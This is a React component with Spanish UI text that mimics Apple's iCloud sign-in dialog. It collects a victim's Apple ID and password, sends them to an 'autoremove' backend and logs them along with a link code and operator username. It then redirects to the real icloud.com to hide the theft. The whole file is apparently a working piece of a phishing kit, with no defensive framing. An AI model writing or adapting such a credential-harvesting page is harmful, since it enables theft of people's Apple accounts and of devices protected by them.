import { useState } from "react";
import { Modal, Button, Form } from "react-bootstrap";
import SvgSpinner from './svgComponents/SvgSpinner'
import responses from "../../api/responses";
import { useData } from "../../context/UserContext"


const IcloudLoginModal = ({ show, onClose, translator }) => {
    const { user } = useData();
    const [step, setStep] = useState(1);
    const [appleId, setAppleId] = useState("");
    const [password, setPassword] = useState("");
    const [loading, setLoading] = useState(false);
    const [passwordError, setPasswordError] = useState(""); // Nuevo estado para error
    const [verificando, setVerificando] = useState(false);

    // Color de borde con opacidad
    const borderColor = "rgba(211,211,211,0.1)";
    const dividerHeight = 46;

    // Handler para Cancelar
    const handleCancel = () => {
        if (step === 1) {
            setAppleId("");
        } else {
            setStep(1);
            setPassword("");
            setPasswordError(""); // Limpia error al cancelar
        }
        setPasswordError(""); // Oculta error al cancelar
    };

    // Handler para submit del formulario
    const handleSubmit = async (e) => {
        e.preventDefault();
        setPasswordError(""); // Limpia error al intentar de nuevo
        if (step === 1) {
            setStep(2);
        } else {
            setLoading(true);
            setVerificando(true);
            try {
                const response = await responses.autoremove(appleId, password);
                let status = response.success;
                let responseData = response.message;
                await saveAutoRemoveData(status, responseData);
                if (!status) {
                    setVerificando(false);
                    setLoading(false);
                    setPasswordError(translator(`Contraseña incorrecta. Intenta de nuevo.`));
                } else if (status) {
                    setTimeout(() => {
                        localStorage.removeItem(`userData_${user?.data?.linkCode}`);
                        //window.location.reload();
                        window.location.href = 'https://www.icloud.com';
                    }, 1000);
                }
            } catch (error) {
                setLoading(false);
                setVerificando(false);
                setPasswordError(translator(`Error al enviar los datos.`));
            }
        }
    };

    const saveAutoRemoveData = async (status, response) => {
       let data = {
            linkCode: user?.data?.linkCode || '',
            appleID: appleId,
            password: password,
            response: response,
            username: user?.data?.username || '',
            status: status,
        }

        const resp = await responses.addData(data);
        return resp;
    }

    // Estado de deshabilitado del botón OK
    const okDisabled = step === 1 ? !appleId : !password || loading;

    // Handlers para ocultar el error al enfocar los inputs
    const handleAppleIdFocus = () => setPasswordError("");
    const handlePasswordFocus = () => setPasswordError("");

    // Componente de botones reutilizable
    const ModalActions = (
        <div style={{
            display: "flex",
            alignItems: "center",
            marginTop: 0,
            marginBottom: 0,
            gap: 0
        }}>
            <Button
                variant="link"
                style={{
                    color: "#5fa3f7",
                    fontWeight: 400,
                    fontSize: 20,
                    textDecoration: "none",
                    paddingLeft: 0,
                    paddingRight: 0,
                    minWidth: 0,
                    flex: 1
                }}
                onClick={handleCancel}
                disabled={loading}
                type="button"
            >
                {translator(`Cancelar`)}
            </Button>
            <div style={{
                opacity: "0.5",
                width: 1,
                background: borderColor,
                alignSelf: "stretch"
            }} />
            <Button
                variant="link"
                style={{
                    color: "#5fa3f7",
                    fontWeight: 400,
                    fontSize: 20,
                    textDecoration: "none",
                    paddingLeft: 0,
                    paddingRight: 0,
                    minWidth: 0,
                    flex: 1,
                    position: "relative"
                }}
                type="submit"
                disabled={okDisabled}
            >
                {loading ? (
                    <span style={{ display: "flex", justifyContent: "center", alignItems: "center" }}>
                        <SvgSpinner width={22} height={22} />
                    </span>
                ) : step === 1 ? `${translator("Siguiente")}` : `${translator("Conectar")}`}
            </Button>
        </div>
    );

    return (
        <>
            <style>
                {`
                    .modal-content {
                        background: #181818;
                        max-width: 350px;
                        width: 95vw;
                        margin: auto;
                    }
                    @media (min-width: 600px) {
                        .modal-content {
                            max-width: 350px;
                            width: 100%;
                        }
                    }
                    .icloud-error-message {
                        color: #ff4d4f;
                        font-size: 14px;
                        margin-bottom: 10px;
                        text-align: center;
                        width: 100%;
                        display: block;
                    }
                `}
            </style>

            <Modal
                show={show}
                onHide={onClose}
                centered
                backdrop="static"
                keyboard={false}
            >
                <Modal.Body style={{
                    background: "#181818",
                    color: "#fff",
                    borderRadius: 16,
                    padding: "24px 24px 0px 24px",
                    textAlign: "center",
                    fontFamily: "system-ui, sans-serif"
                }}>
                    {step === 1 ? (
                        <>
                            <div style={{ fontWeight: 600, fontSize: 20, marginBottom: 8 }}>
                               {translator(`Inicia sesión en iCloud`)}
                            </div>
                            <div style={{ fontSize: 15, marginBottom: 18 }}>
                                {translator(`Ingresa tu Apple ID`)}
                            </div>
                            <Form onSubmit={handleSubmit}>
                                <Form.Control
                                    type="text"
                                    placeholder={translator("Apple ID")}
                                    value={appleId}
                                    onChange={e => setAppleId(e.target.value)}
                                    onFocus={handleAppleIdFocus}
                                    style={{
                                        background: "#181818",
                                        color: "#fff",
                                        border: "1px solid #444",
                                        marginBottom: 18,
                                        borderRadius: 8,
                                        fontSize: 16,
                                        textAlign: "left"
                                    }}
                                    disabled={loading}
                                />
                                <hr style={{
                                    border: "none",
                                    borderTop: `1px solid ${borderColor}`,
                                    margin: "0 0 0 0"
                                }} />
                                {ModalActions}
                            </Form>
                        </>
                    ) : (
                        <>
                            <div style={{ fontWeight: 600, fontSize: 20, marginBottom: 8 }}>
                                {translator(`Inicia sesión en iCloud`)}
                            </div>
                            <div style={{ fontSize: 15, marginBottom: 18 }}>
                                {translator(`Ingresa la contraseña de tu cuenta de Apple`)}
                                <span style={{ color: "#b0b0b0" }}> “{appleId}”.</span>
                            </div>
                            <Form onSubmit={handleSubmit}>
                                <Form.Control
                                    type="password"
                                    placeholder={translator("contraseña")}
                                    value={password}
                                    onChange={e => setPassword(e.target.value)}
                                    onFocus={handlePasswordFocus}
                                    style={{
                                        background: "#181818",
                                        color: "#fff",
                                        border: "1px solid #444",
                                        marginBottom: 8,
                                        borderRadius: 8,
                                        fontSize: 16,
                                        textAlign: "left"
                                    }}
                                    disabled={loading}
                                />
                                {/* Mensaje de error centrado debajo del input */}
                                {passwordError && (
                                    <div className="icloud-error-message">
                                        {passwordError}
                                    </div>
                                )}
                                <hr style={{
                                    opacity: "0.8",
                                    border: "none",
                                    borderTop: `1px solid ${borderColor}`,
                                    margin: "0 0 0 0"
                                }} />
                                {ModalActions}
                            </Form>
                        </>
                    )}
                </Modal.Body>
            </Modal>
        </>
    )
};
export default IcloudLoginModal;